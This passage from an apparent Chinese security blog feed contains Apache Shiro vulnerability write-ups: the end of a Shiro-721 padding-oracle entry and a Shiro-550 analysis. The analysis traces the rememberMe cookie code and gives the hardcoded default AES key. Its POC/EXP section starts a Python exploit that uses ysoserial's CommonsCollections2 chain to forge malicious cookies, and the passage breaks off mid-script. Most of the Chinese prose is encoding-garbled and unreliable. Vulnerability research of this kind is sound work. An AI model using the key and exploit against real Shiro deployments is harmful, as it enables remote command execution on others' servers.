r1+=<span class="hljs-string">&#x27;0&#x27;</span><br>        r1+=(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">int</span>(a[q],<span class="hljs-number">16</span>)^(n+<span class="hljs-number">2</span>))[<span class="hljs-number">2</span>:])<br></code></pre></td></tr></table></figure></li><li>å¾—åˆ°å…¶ä»–åˆ†ç»„<br>åˆ©ç”¨ä¸Šè¿°æ–¹æ³•å¯ä»¥æ¢å¤ä»»æ„ä¸€ä¸ªåˆ†ç»„ï¼Œçš„è§£å¯†ä¸­é—´çŠ¶æ€<br><img src="https://s2.loli.net/2023/01/05/cmxurhqOsZ1g8FH.png"><br>æ­¤æ—¶å†æ ¹æ®æˆªè·çš„ä¸Šä¸€ä¸ªåˆ†ç»„å¯†æ–‡yâ€™ï¼Œæ¥è·å¾—çœŸå®çš„æ˜æ–‡<br><img src="https://s2.loli.net/2023/01/05/6at1PIJKshNmwEq.png"></li></ol><p>åœ¨ä¸çŸ¥é“å¯†é’¥çš„æƒ…å†µä¸‹ï¼Œå®Œæˆæ•°æ®çš„åŠ å¯†ï¼Œç»•è¿‡æœåŠ¡ç«¯çš„æ ¡éªŒï¼ˆè§£å¯†æˆåŠŸ+æ˜æ–‡æœ‰æ•ˆï¼‰ï¼Œè¾¾åˆ°æ”»å‡»çš„ç›®çš„ï¼Œè¿™å°±æ˜¯å¡«å……Oracleæ”»å‡»</p><h1 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h1><p>å¯ä»¥ä¸‹è½½<a href="https://github.com/phith0n/JavaThings/tree/master/shirodemo">pç¥çš„ç¯å¢ƒ</a><br>æ¢ä¸€ä¸‹pom.xmlä¸­shiroçš„ç‰ˆæœ¬å³å¯<br>ç„¶åæœ‰expä¹Ÿå¯ä»¥ç›´æ¥ä½¿ç”¨<a href="https://github.com/feihong-cs/ShiroExploit-Deprecated">exp</a><br>æˆ‘è¿™é‡Œè¿˜æ˜¯ä¸ºäº†çœäº‹ï¼Œç›´æ¥ç”¨vulhubæ­å»ºçš„<br><img src="https://s2.loli.net/2023/01/05/FMy56qkQ8Iws4la.png"><br>ç„¶åè¿˜æ˜¯å·¥å…·ä¸€æŠŠæ¢­<br><img src="https://s2.loli.net/2023/01/05/aOqyfvmG4YFTESw.png"></p>]]></content>
      
      
      <categories>
          
          <category> æ¼æ´å¤ç° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ¡†æ¶æ¼æ´ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Shiro-550æ¼æ´åˆ†æä¸å¤ç°</title>
      <link href="2023/01/04/Shiro-550%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/"/>
      <url>2023/01/04/Shiro-550%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<p>Apache Shiroæ˜¯ä¸€æ¬¾å¼€æºå®‰å…¨æ¡†æ¶ï¼Œæä¾›èº«ä»½éªŒè¯ã€æˆæƒã€å¯†ç å­¦å’Œä¼šè¯ç®¡ç†ã€‚Shiroæ¡†æ¶ç›´è§‚ã€æ˜“ç”¨ï¼ŒåŒæ—¶ä¹Ÿèƒ½æä¾›å¥å£®çš„å®‰å…¨æ€§ã€‚<br>Apache Shiro 1.2.4åŠä»¥å‰ç‰ˆæœ¬ä¸­ï¼ŒåŠ å¯†çš„ç”¨æˆ·ä¿¡æ¯åºåˆ—åŒ–åå­˜å‚¨åœ¨åä¸ºremember-meçš„Cookieä¸­ã€‚æ”»å‡»è€…å¯ä»¥ä½¿ç”¨Shiroçš„é»˜è®¤å¯†é’¥ä¼ªé€ ç”¨æˆ·Cookieï¼Œè§¦å‘Javaååºåˆ—åŒ–æ¼æ´ï¼Œè¿›è€Œåœ¨ç›®æ ‡æœºå™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚</p><blockquote><p>å½±å“ç‰ˆæœ¬ Shiro &lt;= 1.2.4</p></blockquote><a id="more"></a><p>å½“åç«¯æ¥æ”¶åˆ°æ¥è‡ªæœªç»èº«ä»½éªŒè¯çš„ç”¨æˆ·çš„è¯·æ±‚æ—¶ï¼Œå¤„ç†Cookieçš„æµç¨‹æ˜¯</p><ol><li>æ£€ç´¢cookieä¸­RememberMeçš„å€¼</li><li>Base64è§£ç </li><li>ä½¿ç”¨AESè§£å¯†</li><li>ååºåˆ—åŒ–</li></ol><h1 id="ç¯å¢ƒå‡†å¤‡"><a href="#ç¯å¢ƒå‡†å¤‡" class="headerlink" title="ç¯å¢ƒå‡†å¤‡"></a>ç¯å¢ƒå‡†å¤‡</h1><ul><li>shiro: <a href="https://github.com/apache/shiro/tree/shiro-root-1.2.4">shiro-root-1.2.4</a></li><li>server: <a href="https://tomcat.apache.org/download-80.cgi">tomcat 8.5.75</a></li></ul><p>æˆ–è€…ä½¿ç”¨<a href="https://vulhub.org/">vulhub</a>æ¥æ›´æ–¹ä¾¿çš„æ­å»ºæ•´ä¸ªé¶åœºç¯å¢ƒ<br>é¦–å…ˆæˆ‘ä»¬å…ˆæ¥åˆ†æä¸‹shiroçš„æºç <br>å…ˆdownä¸‹æ¥ï¼Œåœ¨IJé‡Œé¢æ‰“å¼€ï¼Œç„¶åé™é™åœ°ç­‰å®ƒä¸‹è½½</p><h1 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h1><p>é¦–å…ˆï¼Œæˆ‘ä»¬å…ˆæ˜ç¡®æµç¨‹ä¸å¯¹çº¿ï¼Œä¸»è¦æ˜¯ç ”ç©¶åœ¨RememberMeä¹‹åçš„ç™»å½•è¿‡ç¨‹</p><h2 id="åŠ å¯†"><a href="#åŠ å¯†" class="headerlink" title="åŠ å¯†"></a>åŠ å¯†</h2><p>åœ¨æ‰“å¼€RememberMeä¹‹åï¼Œå…¶ä¸‹ä¸€æ­¥å°±æ˜¯åŠ å¯†ï¼Œé‚£æˆ‘ä»¬å…ˆæ‰¾åˆ°RememberMeè¿™ä¸ªåœ°æ–¹</p><blockquote><p>core/src/main/java/org.apache.shiro/mgt/AbstractRememberMeManager<br>ç„¶åæ‰¾åˆ°åˆ¤æ–­RememberMeå’Œç™»å½•è®¤è¯çš„å‡½æ•°</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">onSuccessfulLogin</span><span class="hljs-params">(Subject subject, AuthenticationToken token, AuthenticationInfo info)</span> </span>&#123;<br>    <span class="hljs-comment">//always clear any previous identity:</span><br>    forgetIdentity(subject);<br><br>    <span class="hljs-comment">//now save the new identity:</span><br>    <span class="hljs-keyword">if</span> (isRememberMe(token)) &#123;<br>        rememberIdentity(subject, token, info);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">if</span> (log.isDebugEnabled()) &#123;<br>            log.debug(<span class="hljs-string">&quot;AuthenticationToken did not indicate RememberMe is requested.  &quot;</span> +<br>                    <span class="hljs-string">&quot;RememberMe functionality will not be executed for corresponding account.&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬æ¥åˆ†æè·Ÿè¿›ä¸€ä¸‹<br>é¦–å…ˆæ˜¯åœ¨<code>onSuccessfulLogin</code>å‡½æ•°ä¸­<code>forgetIdentity(subject);</code>ï¼Œæ¸…é™¤äº†è®¤è¯ä¿¡æ¯ï¼Œç„¶åé€šè¿‡<code>isRememberMe</code><br>å…ˆæ¥è·Ÿè¿›è¯¥å‡½æ•°</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">isRememberMe</span><span class="hljs-params">(AuthenticationToken token)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> token != <span class="hljs-keyword">null</span> &amp;&amp; (token insta    nceof RememberMeAuthenticationToken) &amp;&amp;<br>            ((RememberMeAuthenticationToken) token).isRememberMe();<br>&#125;<br></code></pre></td></tr></table></figure><p>å°±æ˜¯ä¸ªé€šè¿‡RememberMeæ¥åˆ¤æ–­æ˜¯å¦æœ‰è®¤è¯ä¿¡æ¯çš„å‡½æ•°ï¼Œæ²¡ä»€ä¹ˆä¸œè¥¿ï¼Œé‚£å›æ¥å¾€ä¸‹çœ‹<br>æ¥ç€å°±æ˜¯è¿™ä¸ªä¸œè¥¿ï¼Œæˆ‘ä»¬ç»§ç»­è·Ÿè¿›<code>rememberIdentity(subject, token, info);</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">rememberIdentity</span><span class="hljs-params">(Subject subject, AuthenticationToken token, AuthenticationInfo authcInfo)</span> </span>&#123;<br>        PrincipalCollection principals = getIdentityToRemember(subject, authcInfo);<br>        rememberIdentity(subject, principals);<br>    &#125;<br></code></pre></td></tr></table></figure><p>é¦–å…ˆè°ƒç”¨äº†<code>getIdentityToRemember</code>å‡½æ•°ï¼Œç”¨æ¥åˆ¤æ–­æ˜¯è·å–ç”¨æˆ·èº«ä»½<br>æ¥ç€è·Ÿè¿›<code>rememberIdentity</code>å‡½æ•°</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">rememberIdentity</span><span class="hljs-params">(Subject subject, PrincipalCollection accountPrincipals)</span> </span>&#123;<br>    <span class="hljs-keyword">byte</span>[] bytes = convertPrincipalsToBytes(accountPrincipals);<br>    rememberSerializedIdentity(subject, bytes);<br>&#125;<br></code></pre></td></tr></table></figure><p>çœ‹å‡½æ•°å<code>convertPrincipalsToBytes</code>åº”è¯¥æ˜¯æŠŠ<code>accountPrincipals</code>è½¬æ¢ä¸ºäº†Byteç±»å‹ï¼Œä¹Ÿå¯ä»¥è·Ÿè¿›çœ‹çœ‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">byte</span>[] convertPrincipalsToBytes(PrincipalCollection principals) &#123;<br>    <span class="hljs-keyword">byte</span>[] bytes = serialize(principals);<br>    <span class="hljs-keyword">if</span> (getCipherService() != <span class="hljs-keyword">null</span>) &#123;<br>        bytes = encrypt(bytes);<br>    &#125;<br>    <span class="hljs-keyword">return</span> bytes;<br>&#125;<br></code></pre></td></tr></table></figure><p>åœ¨è¿™é‡Œå±…ç„¶è—äº†ä¸€ä¸ªåºåˆ—åŒ–ï¼Œè¿˜æœ‰åŠ å¯†ï¼Œæˆ‘ä»¬è·Ÿè¿›è¿™ä¸ªåŠ å¯†çœ‹çœ‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">byte</span>[] encrypt(<span class="hljs-keyword">byte</span>[] serialized) &#123;<br>    <span class="hljs-keyword">byte</span>[] value = serialized;<br>    CipherService cipherService = getCipherService();<br>    <span class="hljs-keyword">if</span> (cipherService != <span class="hljs-keyword">null</span>) &#123;<br>        ByteSource byteSource = cipherService.encrypt(serialized, getEncryptionCipherKey());<br>        value = byteSource.getBytes();<br>    &#125;<br>    <span class="hljs-keyword">return</span> value;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/01/04/HgeLRnpxDYit7hs.png"><br>åœ¨debugä¸­å¯ä»¥çœ‹åˆ°ï¼Œè¿™é‡Œæ˜¯ç”¨åˆ°äº†CBCæ¨¡å¼ï¼Œå¯¹åºåˆ—åŒ–åçš„ç”¨æˆ·rootè¿›è¡Œçš„AESåŠ å¯†ï¼Œé€šè¿‡<code>getEncryptionCipherKey</code>æ¥è·å–å¯†é’¥ä¿¡æ¯ï¼Œç»§ç»­è·Ÿè¿›è¿™ä¸ªå‡½æ•°</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">byte</span>[] getEncryptionCipherKey() &#123;<br>    <span class="hljs-keyword">return</span> encryptionCipherKey;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ï¼Œè¿™é‡Œæ˜¯è¿”å›çš„å›ºå®šå¸¸é‡<br><code>private static final byte[] DEFAULT_CIPHER_KEY_BYTES = Base64.decode(&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;);</code><br><img src="https://s2.loli.net/2023/01/04/oBtaZEwTKyOVIec.png"><br>ä¹Ÿå¯ä»¥å¾ˆæ˜æ˜¾çš„çœ‹åˆ°ï¼Œæ”¹å¯†é’¥ä¹Ÿæ˜¯å”¯ä¸€ä½¿ç”¨çš„å¸¸é‡å¯†é’¥</p><p>æ¸…æ¥šè¿™ä¸€ç‚¹ä¹‹åæˆ‘ä»¬å†å›åˆ°<code>rememberIdentity</code>å‡½æ•°ä¸­çš„<code>rememberSerializedIdentity</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">rememberSerializedIdentity</span><span class="hljs-params">(Subject subject, <span class="hljs-keyword">byte</span>[] serialized)</span> </span>&#123;<br><br>        <span class="hljs-keyword">if</span> (!WebUtils.isHttp(subject)) &#123;<br>            <span class="hljs-keyword">if</span> (log.isDebugEnabled()) &#123;<br>                String msg = <span class="hljs-string">&quot;Subject argument is not an HTTP-aware instance.  This is required to obtain a servlet &quot;</span> +<br>                        <span class="hljs-string">&quot;request and response in order to set the rememberMe cookie. Returning immediately and &quot;</span> +<br>                        <span class="hljs-string">&quot;ignoring rememberMe operation.&quot;</span>;<br>                log.debug(msg);<br>            &#125;<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br><br><br>        HttpServletRequest request = WebUtils.getHttpRequest(subject);<br>        HttpServletResponse response = WebUtils.getHttpResponse(subject);<br><br>        <span class="hljs-comment">//base 64 encode it and store as a cookie:</span><br>        String base64 = Base64.encodeToString(serialized);<br><br>        Cookie template = getCookie(); <span class="hljs-comment">//the class attribute is really a template for the outgoing cookies</span><br>        Cookie cookie = <span class="hljs-keyword">new</span> SimpleCookie(template);<br>        cookie.setValue(base64);<br>        cookie.saveTo(request, response);<br>    &#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œçš„ä¸»è¦è¿‡ç¨‹å°±æ˜¯ä¸ªbase64ç¼–ç ï¼Œç„¶åæ”¾åˆ°cookieé‡Œé¢</p><p>è¿™é‡Œæ•´ä¸ªå­˜å…¥çš„æµç¨‹å°±å°±ç»“æŸäº†ï¼Œè¿˜æ˜¯ååˆ†å¥½ç†è§£ä¸”é€»è¾‘æ¸…æ™°çš„</p><blockquote><p>åºåˆ—åŒ–â€”&gt;AESåŠ å¯†â€”&gt;base64ç¼–ç â€”&gt;è®¾ç½®åˆ°cookieä¸­çš„remembermeå­—æ®µ</p></blockquote><h2 id="è§£å¯†"><a href="#è§£å¯†" class="headerlink" title="è§£å¯†"></a>è§£å¯†</h2><p>è§£å¯†è¿‡ç¨‹çš„åˆ†æï¼Œæˆ‘ä»¬é¦–å…ˆæ‰¾åˆ°æ”¶åˆ°è®¤è¯æ—¶çš„åœ°æ–¹</p><blockquote><p>core/src/main/java/org.apache.shiro/mgt/DefaultSecurityManager</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">protected</span> PrincipalCollection <span class="hljs-title">getRememberedIdentity</span><span class="hljs-params">(SubjectContext subjectContext)</span> </span>&#123;<br>        RememberMeManager rmm = getRememberMeManager();<br>        <span class="hljs-keyword">if</span> (rmm != <span class="hljs-keyword">null</span>) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-keyword">return</span> rmm.getRememberedPrincipals(subjectContext);<br>            &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>                <span class="hljs-keyword">if</span> (log.isWarnEnabled()) &#123;<br>                    String msg = <span class="hljs-string">&quot;Delegate RememberMeManager instance of type [&quot;</span> + rmm.getClass().getName() +<br>                            <span class="hljs-string">&quot;] threw an exception during getRememberedPrincipals().&quot;</span>;<br>                    log.warn(msg, e);<br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>    &#125;<br></code></pre></td></tr></table></figure><p>æ¥ç€æˆ‘ä»¬è¿˜æ˜¯æ¥é€æ­¥åˆ†æï¼Œæœ€å¼€å§‹æ˜¯<code>getRememberMeManager</code>å‡½æ•°</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> RememberMeManager <span class="hljs-title">getRememberMeManager</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> rememberMeManager;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç®€å•çš„è·å–ç”¨æˆ·ä¿¡æ¯<br>æ¥ç€å°±æ˜¯<code>getRememberedPrincipals</code>å‡½æ•°</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> PrincipalCollection <span class="hljs-title">getRememberedPrincipals</span><span class="hljs-params">(SubjectContext subjectContext)</span> </span>&#123;<br>    PrincipalCollection principals = <span class="hljs-keyword">null</span>;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">byte</span>[] bytes = getRememberedSerializedIdentity(subjectContext);<br>        <span class="hljs-comment">//SHIRO-138 - only call convertBytesToPrincipals if bytes exist:</span><br>        <span class="hljs-keyword">if</span> (bytes != <span class="hljs-keyword">null</span> &amp;&amp; bytes.length &gt; <span class="hljs-number">0</span>) &#123;<br>            principals = convertBytesToPrincipals(bytes, subjectContext);<br>        &#125;<br>    &#125; <span class="hljs-keyword">catch</span> (RuntimeException re) &#123;<br>        principals = onRememberedPrincipalFailure(re, subjectContext);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> principals;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œè°ƒç”¨çš„å‡½æ•°æœ‰ç‚¹å¤šï¼Œæˆ‘ä»¬ä¸€ä¸ªä¸€ä¸ªæ¥çœ‹,é¦–å…ˆæ˜¯<code>getRememberedSerializedIdentity</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">byte</span>[] getRememberedSerializedIdentity(SubjectContext subjectContext) &#123;<br><br>        <span class="hljs-keyword">if</span> (!WebUtils.isHttp(subjectContext)) &#123;<br>            <span class="hljs-keyword">if</span> (log.isDebugEnabled()) &#123;<br>                String msg = <span class="hljs-string">&quot;SubjectContext argument is not an HTTP-aware instance.  This is required to obtain a &quot;</span> +<br>                        <span class="hljs-string">&quot;servlet request and response in order to retrieve the rememberMe cookie. Returning &quot;</span> +<br>                        <span class="hljs-string">&quot;immediately and ignoring rememberMe operation.&quot;</span>;<br>                log.debug(msg);<br>            &#125;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>        &#125;<br><br>        WebSubjectContext wsc = (WebSubjectContext) subjectContext;<br>        <span class="hljs-keyword">if</span> (isIdentityRemoved(wsc)) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>        &#125;<br><br>        HttpServletRequest request = WebUtils.getHttpRequest(wsc);<br>        HttpServletResponse response = WebUtils.getHttpResponse(wsc);<br><br>        String base64 = getCookie().readValue(request, response);<br>        <span class="hljs-comment">// Browsers do not always remove cookies immediately (SHIRO-183)</span><br>        <span class="hljs-comment">// ignore cookies that are scheduled for removal</span><br>        <span class="hljs-keyword">if</span> (Cookie.DELETED_COOKIE_VALUE.equals(base64)) <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br><br>        <span class="hljs-keyword">if</span> (base64 != <span class="hljs-keyword">null</span>) &#123;<br>            base64 = ensurePadding(base64);<br>            <span class="hljs-keyword">if</span> (log.isTraceEnabled()) &#123;<br>                log.trace(<span class="hljs-string">&quot;Acquired Base64 encoded identity [&quot;</span> + base64 + <span class="hljs-string">&quot;]&quot;</span>);<br>            &#125;<br>            <span class="hljs-keyword">byte</span>[] decoded = Base64.decode(base64);<br>            <span class="hljs-keyword">if</span> (log.isTraceEnabled()) &#123;<br>                log.trace(<span class="hljs-string">&quot;Base64 decoded byte array length: &quot;</span> + (decoded != <span class="hljs-keyword">null</span> ? decoded.length : <span class="hljs-number">0</span>) + <span class="hljs-string">&quot; bytes.&quot;</span>);<br>            &#125;<br>            <span class="hljs-keyword">return</span> decoded;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">//no cookie set - new site visitor?</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>é¦–å…ˆæ˜¯<code>getCookie().readValue</code>è¯»å–cookieï¼Œå†é€šè¿‡<code>ensurePadding</code>å‡½æ•°è¿›è¡Œbase64çš„è§£ç <br>ç„¶åè¿›åˆ°<code>convertBytesToPrincipals</code>å‡½æ•°ï¼Œç»§ç»­è·Ÿè¿›</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">protected</span> PrincipalCollection <span class="hljs-title">convertBytesToPrincipals</span><span class="hljs-params">(<span class="hljs-keyword">byte</span>[] bytes, SubjectContext subjectContext)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (getCipherService() != <span class="hljs-keyword">null</span>) &#123;<br>        bytes = decrypt(bytes);<br>    &#125;<br>    <span class="hljs-keyword">return</span> deserialize(bytes);<br>&#125;<br></code></pre></td></tr></table></figure><p>å®ç°äº†ä¸€ä¸ªè§£å¯†ï¼Œç„¶åååºåˆ—åŒ–ï¼Œè€Œè¿™ä¸ªdecryptè‚¯å®šä¸å‰é¢çš„åŠ å¯†å¯¹ç§°ï¼Œä¸ºCBCæ¨¡å¼çš„AES<br>é‚£æ•´ä¸ªçš„è¯»å–æµç¨‹ä¹Ÿç»“æŸäº†</p><blockquote><p>è¯»å–cookieä¸­çš„rememberMeâ€”&gt;base64è§£ç â€”&gt;AESè§£å¯†â€”&gt;ååºåˆ—åŒ–</p></blockquote><h1 id="POC-EXP"><a href="#POC-EXP" class="headerlink" title="POC EXP"></a>POC EXP</h1><p>æ ¹æ®apacheçš„ç‰ˆæœ¬</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.commons<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections4<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br></code></pre></td></tr></table></figure><p>æ‰€ä»¥EXPå¯ä»¥ç›´æ¥ä½¿ç”¨CommonsCollections2çš„é“¾å­ï¼Œåˆ©ç”¨ysoserialç”Ÿæˆ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> uuid<br><span class="hljs-keyword">import</span> subprocess<br><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">encode_rememberme</span>(<span class="hljs-params">command</span>):</span><br>    <span class="hljs-comment"># è¿™é‡Œä½¿ç”¨CommonsCollections2æ¨¡å—</span><br>    popen = subprocess.Popen([<span class="hljs-string">&#x27;java&#x27;</span>, <span class="hljs-string">&#x27;-jar&#x27;</span>, <span class="hljs-string">&#x27;ysoserial.jar&#x27;</span>, <span 